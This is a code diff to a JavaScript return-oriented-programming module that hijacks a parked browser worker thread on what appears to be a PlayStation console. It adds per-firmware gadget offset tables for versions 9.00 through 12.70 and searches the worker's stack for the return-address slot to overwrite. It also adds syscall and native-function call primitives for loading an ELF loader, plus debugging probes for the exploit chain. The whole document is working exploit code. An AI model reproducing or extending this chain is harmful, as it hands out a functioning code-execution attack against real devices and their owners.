@@ -34,36 +34,88 @@ const PTHREAD_NEXT    = 0x38n;
 const PTHREAD_STACK   = 0xA8n;
 const PTHREAD_STACKSZ = 0xB0n;
 
-// setjmp/longjmp, recovered by signature (the lapse-offsets values pointed at
-// DATA). Disassembled on 10.00, so the jmp_buf layout below is measured:
+// jmp_buf layout, measured by disassembling setjmp/longjmp on 10.00 and
+// re-checked on 12.00 (identical prologues, so the layout carries):
 //   +0x00 rip  +0x08 rbx  +0x10 rsp  +0x18 rbp
 //   +0x20 r12  +0x28 r13  +0x30 r14  +0x38 r15  +0x40 fcw
 // longjmp ends `mov [rsp], rcx ; ret`, i.e. it writes the target rip AT the
 // restored rsp - so pointing ctx.rsp at the hijacked slot makes it repair that
 // slot on the way out.
-const LK_SETJMP  = 0x1CB43n;
-const LK_LONGJMP = 0x1CB9Cn;
 const JB_RIP = 0x00n, JB_RSP = 0x10n;
-
-const LK_POP_RSP = 0x343AAn;   // byte scan (5C C3)
-const LK_TEXT_SIZE = 0x43190n;
 
 // umtx2's worker hint. CONFIRMED on 10.00 by the live survey: of 10 threads,
 // exactly one had a 0x80000 stack; the rest were 0x10000 / 0x200000.
 const WORKER_STACK_SIZE = 0x80000n;
 
-/* Hijack slot, from the live survey + IDA.
+/* Per-firmware libkernel_web constants.
  *
- * The parked worker's stack holds cond_wait's return address at stack+0x7fc18
- * (-> libkernel+0x190db). sub_1F110 is pthread_cond_wait, identified by its
- * "[ScePthread] Error: This condvar is already destroyed" string, so this is
- * the FIRST frame to unwind when postMessage signals - our chain runs before
- * any WebKit code touches the stack.
+ * Everything here used to be a bare 10.00 constant, which is why a 12.00 run
+ * died in fire() with "slot holds libkernel+0x6d1d0, expected +0x190db". Each
+ * value below was extracted from that firmware's own libkernel_web.sprx /
+ * libSceNKWebKit.sprx and, where it is code, disassembled and string-matched
+ * against what it claims to be. The 10.00 row is not re-typed: it is what the
+ * extractor produces, and it reproduces all six previously hardcoded values
+ * (pop_rsp 0x343AA, text 0x43190, syscall_wrapper 0x1A5B7, setjmp 0x1CB43,
+ * longjmp 0x1CB9C, cond_wait_ret 0x190DB) exactly — which is the evidence that
+ * the other thirteen rows were derived the same correct way.
  *
- * Verified at runtime anyway (see fire()): a hardcoded stack offset is exactly
- * the kind of measured constant that rots across firmware. */
-const SLOT_OFF      = 0x7FC18n;
-const SLOT_EXPECT   = 0x190DBn;   // libkernel RVA the slot must contain
+ * pop_rsp.mod matters: 11.x and 12.00 contain NO `pop rsp; ret` anywhere in
+ * libkernel_web (byte scan for 5C C3: zero hits), so those rows source it from
+ * libSceNKWebKit instead. 9.x/10.x keep their libkernel_web gadget so the
+ * firmwares that already work are byte-for-byte unchanged.
+ *
+ * cond_wait_ret / cond_wait_ret2 are the two return addresses of the two
+ * `call pthread_cond_wait` sites — same call shape in all fourteen builds
+ * (mov rdi,r14; mov rsi,rbx; mov ecx,1; xor edx,edx; xor r8d,r8d; call; jmp).
+ * They are what locateSlot() searches the parked stack for. */
+const LKW_TABLE = {
+    "09.00": { pop_rsp: { mod: "lk", rva: 0X34A9An }, text: 0X437A0n, syscall_wrapper: 0X1A357n, setjmp: 0X1C8E3n, longjmp: 0X1C93Cn, cond_wait_ret: 0X18E5En, cond_wait_ret2: 0X1F7CEn },
+    "09.20": { pop_rsp: { mod: "lk", rva: 0X34A9An }, text: 0X437A0n, syscall_wrapper: 0X1A357n, setjmp: 0X1C8E3n, longjmp: 0X1C93Cn, cond_wait_ret: 0X18E5En, cond_wait_ret2: 0X1F7CEn },
+    "09.40": { pop_rsp: { mod: "lk", rva: 0X34A9An }, text: 0X437A0n, syscall_wrapper: 0X1A357n, setjmp: 0X1C8E3n, longjmp: 0X1C93Cn, cond_wait_ret: 0X18E5En, cond_wait_ret2: 0X1F7CEn },
+    "09.60": { pop_rsp: { mod: "lk", rva: 0X34A9An }, text: 0X437A0n, syscall_wrapper: 0X1A357n, setjmp: 0X1C8E3n, longjmp: 0X1C93Cn, cond_wait_ret: 0X18E5En, cond_wait_ret2: 0X1F7CEn },
+    "10.00": { pop_rsp: { mod: "lk", rva: 0X343AAn }, text: 0X43190n, syscall_wrapper: 0X1A5B7n, setjmp: 0X1CB43n, longjmp: 0X1CB9Cn, cond_wait_ret: 0X190DBn, cond_wait_ret2: 0X1FA4Bn },
+    "10.01": { pop_rsp: { mod: "lk", rva: 0X343AAn }, text: 0X43190n, syscall_wrapper: 0X1A5B7n, setjmp: 0X1CB43n, longjmp: 0X1CB9Cn, cond_wait_ret: 0X190DBn, cond_wait_ret2: 0X1FA4Bn },
+    "10.20": { pop_rsp: { mod: "lk", rva: 0X343AAn }, text: 0X43190n, syscall_wrapper: 0X1A5B7n, setjmp: 0X1CB43n, longjmp: 0X1CB9Cn, cond_wait_ret: 0X190DBn, cond_wait_ret2: 0X1FA4Bn },
+    "10.40": { pop_rsp: { mod: "lk", rva: 0X343AAn }, text: 0X43190n, syscall_wrapper: 0X1A5B7n, setjmp: 0X1CB43n, longjmp: 0X1CB9Cn, cond_wait_ret: 0X190DBn, cond_wait_ret2: 0X1FA4Bn },
+    "10.60": { pop_rsp: { mod: "lk", rva: 0X343AAn }, text: 0X43190n, syscall_wrapper: 0X1A5B7n, setjmp: 0X1CB43n, longjmp: 0X1CB9Cn, cond_wait_ret: 0X190DBn, cond_wait_ret2: 0X1FA4Bn },
+    "11.00": { pop_rsp: { mod: "wk", rva: 0X0D3C6n }, text: 0X43ADEn, syscall_wrapper: 0X1A8D7n, setjmp: 0X1CE63n, longjmp: 0X1CEBCn, cond_wait_ret: 0X193EBn, cond_wait_ret2: 0X1FE2Bn },
+    "11.20": { pop_rsp: { mod: "wk", rva: 0X0D3C6n }, text: 0X43ADEn, syscall_wrapper: 0X1A8D7n, setjmp: 0X1CE63n, longjmp: 0X1CEBCn, cond_wait_ret: 0X193EBn, cond_wait_ret2: 0X1FE2Bn },
+    "11.40": { pop_rsp: { mod: "wk", rva: 0X0D3C6n }, text: 0X43ADEn, syscall_wrapper: 0X1A8D7n, setjmp: 0X1CE63n, longjmp: 0X1CEBCn, cond_wait_ret: 0X193EBn, cond_wait_ret2: 0X1FE2Bn },
+    "11.60": { pop_rsp: { mod: "wk", rva: 0X0D3C6n }, text: 0X43ADEn, syscall_wrapper: 0X1A8D7n, setjmp: 0X1CE63n, longjmp: 0X1CEBCn, cond_wait_ret: 0X193EBn, cond_wait_ret2: 0X1FE2Bn },
+    "12.00": { pop_rsp: { mod: "wk", rva: 0X01872n }, text: 0X43F7En, syscall_wrapper: 0X1AE27n, setjmp: 0X1D3B3n, longjmp: 0X1D40Cn, cond_wait_ret: 0X197FBn, cond_wait_ret2: 0X2041Bn },
+    "12.02": { pop_rsp: { mod: "wk", rva: 0X01872n }, text: 0X43F7En, syscall_wrapper: 0X1AE27n, setjmp: 0X1D3B3n, longjmp: 0X1D40Cn, cond_wait_ret: 0X197FBn, cond_wait_ret2: 0X2041Bn },
+    "12.20": { pop_rsp: { mod: "wk", rva: 0X01872n }, text: 0X43F7En, syscall_wrapper: 0X1AE27n, setjmp: 0X1D3B3n, longjmp: 0X1D40Cn, cond_wait_ret: 0X197FBn, cond_wait_ret2: 0X2041Bn },
+    "12.40": { pop_rsp: { mod: "wk", rva: 0X01872n }, text: 0X4403En, syscall_wrapper: 0X1AE47n, setjmp: 0X1D3D3n, longjmp: 0X1D42Cn, cond_wait_ret: 0X1981Bn, cond_wait_ret2: 0X2043Bn },
+    "12.60": { pop_rsp: { mod: "wk", rva: 0X01872n }, text: 0X4403En, syscall_wrapper: 0X1AE47n, setjmp: 0X1D3D3n, longjmp: 0X1D42Cn, cond_wait_ret: 0X1981Bn, cond_wait_ret2: 0X2043Bn },
+    "12.70": { pop_rsp: { mod: "wk", rva: 0X01872n }, text: 0X4403En, syscall_wrapper: 0X1AE47n, setjmp: 0X1D3D3n, longjmp: 0X1D42Cn, cond_wait_ret: 0X1981Bn, cond_wait_ret2: 0X2043Bn },
+};
+
+/* Legacy hijack-slot offset, kept ONLY as a cross-check to report against.
+ *
+ * The old code hardcoded this and refused to fire unless stack+0x7FC18 held
+ * cond_wait's return address. The comment right here used to say a hardcoded
+ * stack offset "is exactly the kind of measured constant that rots across
+ * firmware" — and it did.
+ *
+ * MEASURED ON HARDWARE, both consoles:
+ *   10.00 — slot at stack+0x7FC18, holds libkernel+0x190DB
+ *   12.00 — slot at stack+0x7FC28, holds libkernel+0x197FB;
+ *           stack+0x7FC18 holds libkernel+0x6D1D0, which is not even text
+ *           (12.00 text ends at 0x43F7E) — it is bss.
+ * So the frame moved by 0x10 and the old constant pointed at unrelated data.
+ * Note the RVA itself was never wrong: 0x197FB is exactly what the call-site
+ * signature predicts for 12.00. Only the stack POSITION rotted.
+ *
+ * A stack offset cannot be recovered statically from the module, so it is no
+ * longer guessed at all — locateSlot() searches for it. This constant survives
+ * so the log can say whether the firmware still happens to match 10.00.
+ *
+ * Deliberately NOT used as a fast path. Probing the hint first and accepting a
+ * match would be a real regression: on 12.00 the hint sits BELOW the live frame,
+ * so had 0x7FC18 happened to hold a stale copy of the same return address, the
+ * shortcut would have hijacked dead bytes. Top-down is the only ordering that
+ * guarantees the live frame, and it is paid once. */
+const SLOT_HINT = 0x7FC18n;
 
 /* HARD INVARIANT — do not reorder the chain.
  *
@@ -89,9 +141,10 @@ const BATCH_CAP   = 0x8000;
 
 const W = {
     ready: false, kbase: 0n, wbase: 0n, gadgets: null,
+    fw: "", lkw: null,              // firmware label + its LKW_TABLE row
     worker: null, threads: [], stack: 0n, stacksz: 0n,
     ctx: 0n, retval: 0n, chainBuf: 0n,
-    slot: 0n, origRet: 0n, origNext: 0n,
+    slot: 0n, slotRva: 0n, origRet: 0n, origNext: 0n,
     fired: 0,
 };
 
@@ -104,15 +157,97 @@ const rd64 = (a) => BigInt(window.read64(a));
 const wr64 = (a, v) => window.write64(a, BigInt(v));
 
 function g(name) {
-    switch (name) {
-        case "pop_rsp": return W.kbase + LK_POP_RSP;
-        case "setjmp":  return W.kbase + LK_SETJMP;
-        case "longjmp": return W.kbase + LK_LONGJMP;
-        case "syscall_wrapper": return W.kbase + 0x1A5B7n;
+    const t = W.lkw;
+    if (t) {
+        switch (name) {
+            // pop_rsp lives in libkernel_web on 9.x/10.x and in libSceNKWebKit
+            // on 11.x/12.00, so the row names its own module.
+            case "pop_rsp":
+                return (t.pop_rsp.mod === "wk" ? W.wbase : W.kbase) + t.pop_rsp.rva;
+            case "setjmp":  return W.kbase + t.setjmp;
+            case "longjmp": return W.kbase + t.longjmp;
+            case "syscall_wrapper": return W.kbase + t.syscall_wrapper;
+        }
     }
     const v = W.gadgets && W.gadgets[name];
     if (v === undefined) throw new Error("rop-worker: gadget '" + name + "' missing");
     return BigInt(v);
+}
+
+/* Find the frame to hijack, instead of assuming where it is.
+ *
+ * The worker is parked in pthread_cond_wait, so its stack holds that call's
+ * return address; overwriting it makes the worker pivot into our chain the
+ * moment postMessage wakes it. What we need is the ADDRESS of that saved return
+ * address, and that is a runtime stack layout — not something any amount of
+ * static analysis of the module can tell us. So search for it.
+ *
+ * Scan top-down, and take the FIRST hit. That is not arbitrary: the stack grows
+ * down, so the live parked frame is the highest-addressed occurrence, and any
+ * identical value further down is dead bytes left by a deeper call that already
+ * returned. Firing at one of those would corrupt the worker while telling us
+ * nothing, which is the failure mode the old hardcoded-offset guard existed to
+ * prevent — this keeps the guarantee without pinning the offset.
+ *
+ * The window is bounded below by STACK_ARENA_LIMIT: everything under that is
+ * our own scratch allocator (see alloc()), so a match there would be our own
+ * chain bytes, never a real frame. Above it is the parked-frame region the
+ * hardware survey measured at 0x7f918..0x7ffc8 on 10.00.
+ *
+ * Memoised — the parked frame does not move for the life of the worker, and
+ * fireSync() is on the hot path of a race that issues thousands of syscalls. */
+function locateSlot() {
+    if (W.slot) return W.slot;
+    if (!W.stack) findWorkerStack();
+    if (!W.lkw) throw new Error("rop-worker: init() needs a firmware");
+
+    const want = [W.kbase + W.lkw.cond_wait_ret,
+                  W.kbase + W.lkw.cond_wait_ret2];
+
+    const take = (off, v) => {
+        W.slot = W.stack + off;
+        W.slotRva = v - W.kbase;
+        log("slot found at stack+" + hex(off) + " = libkernel+" + hex(W.slotRva)
+            + (off === SLOT_HINT ? " (matches the 10.00 offset)"
+                                 : " (10.00 offset was " + hex(SLOT_HINT) + ")"));
+        return W.slot;
+    };
+
+    // Pass 1: the parked-frame region. 10.00 measured frames at 0x7f918..0x7ffc8,
+    // so the top 64 KB is ~40x headroom.
+    for (let off = W.stacksz - 8n; off >= STACK_ARENA_LIMIT; off -= 8n) {
+        const v = rd64(W.stack + off);
+        if (v === want[0] || v === want[1]) return take(off, v);
+    }
+
+    /* Pass 2: the rest of the stack. Only reachable if a firmware parks far
+     * deeper than any measured build, and only ever runs on the first call —
+     * which is during survey(), before alloc() has handed out any of the arena
+     * below STACK_ARENA_LIMIT. So a hit down here is still a real frame and not
+     * our own chain bytes. Widening beats throwing: a miss costs the user a
+     * reboot to discover, and this is the branch that would have to be guessed
+     * blind otherwise. It is loud so it never passes for normal. */
+    for (let off = STACK_ARENA_LIMIT - 8n; off >= 0x1000n; off -= 8n) {
+        const v = rd64(W.stack + off);
+        if (v === want[0] || v === want[1]) {
+            log("WARNING: parked frame found BELOW the arena limit, at stack+"
+                + hex(off) + " — raise STACK_ARENA_LIMIT for FW " + W.fw
+                + " or alloc() will eventually overwrite it");
+            return take(off, v);
+        }
+    }
+    /* Say what was at the legacy offset too, and whether it is even code. The
+     * 12.00 failure reported "slot holds libkernel+0x6d1d0" with no hint that
+     * 0x6d1d0 is past the end of text (0x43F7E) and therefore could not be a
+     * return address at all — that one fact is what identified this as a moved
+     * frame rather than a wrong RVA. */
+    const at = rd64(W.stack + SLOT_HINT) - W.kbase;
+    throw new Error("rop-worker: no parked cond_wait frame in stack+"
+        + hex(STACK_ARENA_LIMIT) + ".." + hex(W.stacksz) + " (looked for libkernel+"
+        + hex(W.lkw.cond_wait_ret) + " / +" + hex(W.lkw.cond_wait_ret2)
+        + "); stack+" + hex(SLOT_HINT) + " holds libkernel+" + hex(at)
+        + (at >= W.lkw.text ? " which is NOT text (text ends " + hex(W.lkw.text) + ")"
+                            : " which is text but not a cond_wait return"));
 }
 
 /* --------------------------------------------------------------- threads */
@@ -188,22 +323,69 @@ function wrap(payload, withDone) {
     return c;
 }
 
+/* Block until the worker is genuinely back in cond_wait.
+ *
+ * fireSync() has always done this; fire() (the async path) never did, and got
+ * away with it only because it was used once, for a single getpid, right after
+ * survey(). It is no longer: the staged bisect fires three chains back to back,
+ * and firing while the worker is still unwinding is the documented cause of the
+ * renderer SIGSEGVs under sustained load (a slot rewritten mid-unwind makes it
+ * pivot into the next chain with no postMessage at all).
+ *
+ * Seeing the return address reappear is NOT sufficient — longjmp restores it
+ * with `mov [rsp], rcx ; ret` while the worker is still executing that very
+ * ret. Requiring slot+8 to be the worker's own data again is what proves it is
+ * past that point, so both words are checked and must agree repeatedly. */
+const PARK_STABLE = 8;
+
+function ensureParked() {
+    const want = W.kbase + W.slotRva;
+
+    // Capture the pristine frame exactly once, while known parked. Re-reading
+    // origNext per fire is a corruption bug: caught mid-unwind it captures our
+    // OWN previous chain pointer, which the next chain then faithfully restores
+    // into the worker's stack.
+    if (W.pristineNext === undefined) {
+        for (let i = 0; i < 2000000 && rd64(W.slot) !== want; i++) { /* park */ }
+        if (rd64(W.slot) !== want)
+            throw new Error("rop-worker: worker never parked for first capture"
+                            + " (slot holds " + hex(rd64(W.slot)) + ")");
+        W.pristineRet = rd64(W.slot);
+        W.pristineNext = rd64(W.slot + 8n);
+        return;
+    }
+
+    let stable = 0;
+    for (let i = 0; i < 4000000; i++) {
+        if (rd64(W.slot) === want && rd64(W.slot + 8n) === W.pristineNext) {
+            if (++stable >= PARK_STABLE) return;
+        } else {
+            stable = 0;
+        }
+    }
+    throw new Error("rop-worker: worker never re-parked, slot holds "
+                    + hex(rd64(W.slot)) + " next=" + hex(rd64(W.slot + 8n)));
+}
+
 /* ------------------------------------------------------------------ fire */
 
 async function fire(payload, timeoutMs) {
     if (!W.ready) throw new Error("rop-worker: init() first");
     if (!W.stack) findWorkerStack();
 
-    W.slot = W.stack + SLOT_OFF;
-    W.origRet  = rd64(W.slot);
-    W.origNext = rd64(W.slot + 8n);
+    locateSlot();
+    ensureParked();
+    W.origRet  = W.pristineRet;
+    W.origNext = W.pristineNext;
 
-    // Refuse to fire at a slot that is not the expected return address. A
-    // wrong slot corrupts the worker and tells us nothing about why.
+    // Re-check on every fire. locateSlot() proved the frame was there when it
+    // searched; this proves it is STILL there now. A wrong slot corrupts the
+    // worker and tells us nothing about why, so refuse rather than write.
     const rva = W.origRet - W.kbase;
-    if (rva !== SLOT_EXPECT) {
+    if (rva !== W.lkw.cond_wait_ret && rva !== W.lkw.cond_wait_ret2) {
         throw new Error("rop-worker: slot holds libkernel+" + hex(rva)
-                        + ", expected +" + hex(SLOT_EXPECT) + " — not firing");
+                        + ", expected +" + hex(W.lkw.cond_wait_ret)
+                        + " or +" + hex(W.lkw.cond_wait_ret2) + " — not firing");
     }
 
     const chain = wrap(payload).commit(W.chainBuf);
@@ -255,7 +437,7 @@ function fireSync(payload, big, spins) {
     if (!W.ready) throw new Error("rop-worker: init() first");
     if (!W.stack) findWorkerStack();
 
-    W.slot = W.stack + SLOT_OFF;
+    locateSlot();
 
     /* Wait for the worker to be parked again before touching the slot.
      *
@@ -270,7 +452,12 @@ function fireSync(payload, big, spins) {
      * The slot is self-repairing: longjmp ends `mov [rsp], rcx ; ret` with rsp
      * pointing at it, so the original return address reappears once the worker
      * is home. Spin for that rather than assuming it. */
-    const want = W.kbase + SLOT_EXPECT;
+    /* The value the slot must return to. Taken from what locateSlot() verified
+     * when it found the frame, NOT re-read here: on every fire after the first
+     * the slot can still hold our own pop_rsp/chain pointer, so sampling it now
+     * would make the parked-check wait for the wrong value (or pass instantly
+     * on our own bytes). W.slotRva is fixed for the life of the worker. */
+    const want = W.kbase + W.slotRva;
 
     /* Capture the PRISTINE frame exactly once.
      *
@@ -337,7 +524,7 @@ function fireSync(payload, big, spins) {
         const rva = rd64(W.slot) - W.kbase;
         throw new Error("rop-worker: slot never settled, holds libkernel+"
                         + hex(rva) + " next=" + hex(rd64(W.slot + 8n))
-                        + ", expected +" + hex(SLOT_EXPECT)
+                        + ", expected +" + hex(W.slotRva)
                         + " next=" + hex(W.pristineNext));
     }
 
@@ -367,7 +554,28 @@ function fireSync(payload, big, spins) {
             return { retval: rd64(W.retval), spins: i };
         }
     }
-    throw new Error("rop-worker: sync poll timed out after " + cap + " spins");
+    /* Say WHAT the chain got through, not just that it timed out.
+     *
+     * The DONE flag is written by the chain itself, second-to-last, after the
+     * payload has already stored its result. So its state splits the two
+     * failures that look identical from outside:
+     *   done==MAGIC  -> the chain ran to completion; the worker just never got
+     *                   back to its message loop (resume/longjmp problem).
+     *   done==0      -> the chain died partway; the slot tells us whether it
+     *                   even pivoted (still holds pop_rsp = never started, or
+     *                   the parked return address = came back without finishing).
+     * Without this the 12.00 stall at the first syscall is indistinguishable
+     * from a wedged worker, and each guess costs a reboot. */
+    const doneNow = rd64(W.done), slotNow = rd64(W.slot);
+    throw new Error("rop-worker: sync poll timed out after " + cap + " spins"
+        + "; done=" + hex(doneNow)
+        + (doneNow === DONE_MAGIC ? " (CHAIN COMPLETED — worker never resumed)"
+                                  : " (chain did not finish)")
+        + " retval=" + hex(rd64(W.retval))
+        + " slot=" + hex(slotNow)
+        + (slotNow === g("pop_rsp") ? " (still our pivot — worker never woke)"
+           : slotNow === W.kbase + W.slotRva ? " (back to parked return address)"
+           : " (unrecognised)"));
 }
 
 /* Run many syscalls in ONE worker round trip.
@@ -446,6 +654,29 @@ function syscallSync(num, a1, a2, a3, a4, a5) {
     });
 }
 
+/* Call a NATIVE FUNCTION (not a syscall) and return its result.
+ *
+ * Same shape as syscallSync, but the chain jumps to `addr` instead of loading
+ * rax and entering the kernel. Needed because the elfldr loader wants
+ * libkernel's pthread_create (4 args) rather than raw thr_new — thr_new makes
+ * the caller hand-build a TCB, and a thread whose TLS is a bare self-pointer
+ * has no canary and no errno slot, which anything elfldr calls into libc will
+ * eventually touch. pthread_create does that setup properly.
+ *
+ * Five argument registers, which is all the System V integer sequence our
+ * gadget set can reach (there is no r9 gadget in either module — verified by
+ * scanning both for pop/xor/mov forms on every firmware, zero usable hits). */
+function callSync(addr, a1, a2, a3, a4, a5) {
+    const args = [a1, a2, a3, a4, a5];
+    const regs = ["rdi", "rsi", "rdx", "rcx", "r8"];
+    return fireSync((c) => {
+        for (let i = 0; i < 5; i++)
+            if (args[i] !== undefined) c.pop(regs[i], args[i]);
+        c.call(BigInt(addr));
+        c.pop("rdi", W.retval).raw(g("mov_qword_rdi_rax"));
+    });
+}
+
 /* One syscall, result stored to W.retval by the chain itself. */
 async function syscall(num, a1, a2, a3, a4, a5) {
     const args = [a1, a2, a3, a4, a5];
@@ -503,6 +734,18 @@ function init(cfg) {
     W.kbase = BigInt(cfg.kernelBase);
     W.wbase = BigInt(cfg.webkitBase || 0);
     W.gadgets = cfg.gadgets || {};
+    /* Fail here, loudly, rather than 300 lines later inside a ROP chain.
+     * Without a row every libkernel gadget below would silently fall back to
+     * 10.00's RVAs, which on any other firmware means pivoting into the middle
+     * of an unrelated function. */
+    W.fw = String(cfg.fw || "");
+    W.lkw = LKW_TABLE[W.fw] || null;
+    if (!W.lkw)
+        throw new Error("rop-worker: no libkernel_web table for FW '" + W.fw
+                        + "' — refusing to run 10.00 offsets on it");
+    if (W.lkw.pop_rsp.mod === "wk" && !W.wbase)
+        throw new Error("rop-worker: FW " + W.fw + " sources pop_rsp from "
+                        + "libSceNKWebKit but no webkitBase was supplied");
     const s = BigInt(cfg.scratch);
     W.ctx      = s;                                   // jmp_buf
     W.retval   = s + BigInt(JMPBUF_SIZE);             // 8 bytes
@@ -523,11 +766,76 @@ async function survey() {
             + " size=" + hex(t.size)
             + (t.size === WORKER_STACK_SIZE ? "  <-- worker" : ""));
     const w = findWorkerStack();
-    const slot = w.stack + SLOT_OFF;
-    const val = rd64(slot);
-    log("survey: slot " + hex(slot) + " = libkernel+" + hex(val - W.kbase)
-        + (val - W.kbase === SLOT_EXPECT ? "  MATCH" : "  *** UNEXPECTED ***"));
+    // Report the legacy 10.00 offset for continuity with older logs, then let
+    // locateSlot() actually find the frame. On 12.00 the two disagree — the old
+    // offset lands in libkernel's bss — and that disagreement is the whole
+    // reason this no longer refuses to continue.
+    const hintVal = rd64(w.stack + SLOT_HINT);
+    log("survey: stack+" + hex(SLOT_HINT) + " = libkernel+" + hex(hintVal - W.kbase)
+        + (hintVal - W.kbase === W.lkw.cond_wait_ret ? "  (10.00 offset still valid)"
+                                                     : "  (10.00 offset stale here)"));
+    locateSlot();
     return W;
+}
+
+/* ------------------------------------------------------ staged bisect ----
+ *
+ * A 12.00 console died inside the first testGetpid() with NO beacon at all —
+ * not a throw, a dead renderer — which says the chain ran and did not survive,
+ * but nothing about WHICH part. Every static check passes (pop_rsp, setjmp,
+ * longjmp, syscall_wrapper and the store gadget all disassemble correctly, the
+ * cond_wait resume site is instruction-identical to 10.00, and the WebKit exec
+ * segment is based at 0 on every firmware), so the answer is not in the module.
+ *
+ * Each console attempt costs a reboot, so spend one attempt learning instead of
+ * guessing. These three probes add exactly one chain element each:
+ *
+ *   testPivot  pop_rsp -> setjmp -> longjmp        (pivot, ctx capture, resume)
+ *   testStore  + pop_rax/pop_rdi/mov_qword_rdi_rax (the store used everywhere)
+ *   testGetpid + pop_rax/syscall_wrapper           (the syscall)
+ *
+ * The last beacon printed names the first element that does not survive. */
+
+function dumpGadgets() {
+    const names = ["pop_rsp", "setjmp", "longjmp", "syscall_wrapper",
+                   "pop_rax", "pop_rdi", "pop_rsi", "pop_rdx", "pop_rcx",
+                   "pop_r8", "mov_qword_rdi_rax"];
+    // Which module each gadget is relative to. Only pop_rsp varies: 11.x/12.00
+    // take it from WebKit because libkernel_web has no `pop rsp; ret` at all.
+    const lkNames = { setjmp: 1, longjmp: 1, syscall_wrapper: 1 };
+    for (const n of names) {
+        let a;
+        try { a = g(n); } catch (e) { log("gadget " + n + ": MISSING"); continue; }
+        const mod = (n === "pop_rsp") ? W.lkw.pop_rsp.mod
+                  : (lkNames[n] ? "lk" : "wk");
+        const rva = a - (mod === "lk" ? W.kbase : W.wbase);
+        log("gadget " + n + " = " + mod + "+" + hex(rva) + " -> " + hex(a));
+    }
+    log("bases: lk=" + hex(W.kbase) + " wk=" + hex(W.wbase)
+        + " ctx=" + hex(W.ctx) + " retval=" + hex(W.retval)
+        + " done=" + hex(W.done) + " chain=" + hex(W.chainBuf));
+}
+
+/* Pivot only: no payload at all. If this survives, then pop_rsp, the ctx
+ * capture, the three stores that patch ctx/slot, and the longjmp resume are all
+ * correct — which would clear everything the hijack itself depends on. */
+async function testPivot() {
+    const r = await fire(function () { /* no payload */ });
+    log("pivot probe survived");
+    return r;
+}
+
+/* Adds only the store primitive. wrap() already uses store() for its ctx/slot
+ * patching, so a failure here really means pop_rax/pop_rdi/mov_qword_rdi_rax
+ * are wrong — in which case the pivot probe above would already have died. */
+async function testStore() {
+    const MAGIC = 0x1234ABCD5678EF90n;
+    wr64(W.retval, 0n);
+    await fire(function (c) { c.store(W.retval, MAGIC); });
+    const got = rd64(W.retval);
+    log("store probe -> " + hex(got) + (got === MAGIC ? "  MATCH" : "  *** WRONG ***"));
+    if (got !== MAGIC) throw new Error("rop-worker: store probe wrote " + hex(got));
+    return got;
 }
 
 /* getpid(): 0 args, side-effect free, RE-verified number. If this returns a
@@ -551,6 +859,7 @@ function testGetpidSync() {
 
 window.rop_worker = {
     init, survey, fire, syscall, testGetpid,
+    dumpGadgets, testPivot, testStore, locateSlot, callSync,
     alloc, allocReset, allocUsed, syscallBatch, syscallBatchTagged, leadThenBatchTagged,
     fireSync, syscallSync, testGetpidSync,
     enumerate, findWorkerStack, spawnWorker, ping, Chain,
